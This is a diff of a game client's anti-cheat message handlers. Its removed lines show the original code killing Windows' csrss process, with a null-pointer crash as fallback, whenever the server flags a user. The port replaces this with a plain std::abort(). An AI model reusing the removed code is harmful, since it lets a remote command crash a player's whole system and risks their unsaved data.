@@ -5892,30 +5892,9 @@ bool CX2State::Handler_EGS_TRAFFIC_ATTACKER_NOT( HWND hWnd, UINT uMsg, WPARAM wP
 {
 	//THEMIDA_VM_START
 
-	HINSTANCE hInst = LoadLibraryA("Psapi.dll");
-
-	typedef BOOL (WINAPI *TEnumProcess)(DWORD *, DWORD, DWORD *);
-	TEnumProcess fnEnumProcess = (TEnumProcess)GetProcAddress(GetModuleHandle(L"psapi.dll"), "EnumProcesses");
-
-	DWORD dwProcesses[1024], dwNeeded = 0;
-	::ZeroMemory(&dwProcesses, sizeof(DWORD) * 1024);
-
-	// 3번째 배열이 csrss
-	fnEnumProcess((DWORD*)&dwProcesses, sizeof(DWORD) * 1024, &dwNeeded );
-	HANDLE hCsr = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcesses[3]);
-
-	TerminateProcess(hCsr, -1);
-
-	FreeLibrary(hInst);
-
-	CloseHandle( hCsr );
-
-	// 혹시라도 리붓이 실패하면 크래시라도 시킨다.
-	__asm
-	{
-		xor eax, eax
-			call eax
-	}
+	// The original killed the machine's csrss.exe (bringing Windows down) and crashed if that failed. The port only
+	// ends the client.
+	std::abort();
 
 	//THEMIDA_VM_END
 
@@ -7038,11 +7017,7 @@ bool CX2State::Handler_EGS_SERVER_CHECK_HACK_USER_REQ( HWND hWnd, UINT uMsg, WPA
 		case KEGS_SERVER_CHECK_HACK_USER_REQ::HCT_ED_MONITORING_MACHINE_ID_BLOCK:
 			{
 				// 강제 크래쉬
-				__asm
-				{
-					xor eax, eax
-					call eax
-				}
+				std::abort();
 			}
 			break;
 
